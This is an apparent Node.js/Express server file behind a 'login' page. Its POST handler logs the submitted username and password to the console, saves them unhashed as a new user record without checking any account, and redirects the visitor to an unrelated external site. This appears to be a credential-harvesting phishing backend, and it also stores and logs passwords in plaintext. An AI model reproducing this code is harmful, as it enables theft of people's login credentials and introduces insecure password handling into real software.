require("dotenv").config({ path: ".env" });
const express = require("express");
const app = express();
const router = express.Router();
const connectDB = require("./config/db");

const User = require('./models/User')

connectDB();

app.use(express.json());
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: false }));


app.get("/", (req, res, next) => {
  res.render("login");
});

app.post("/", async (req, res, next) => {
  console.log(req.body);
  const { username, password } = req.body;
  try {
    const user = await User.create({
      username,
      password,
    });
    user.save();
    res.redirect('https://grigmag.github.io/maths-exercises/#/');
  } catch (err) {
    next(err);
  }
})

// Connecting Routes


const PORT = process.env.PORT || 5000;

const server = app.listen(PORT, () =>
  console.log(`Sever running on port ${PORT}`)
);

app.use('/.netlify/functions/app',router);

process.on("unhandledRejection", (err, promise) => {
  console.log(`Logged Error: ${err.message}`);
  server.close(() => process.exit(1));
});
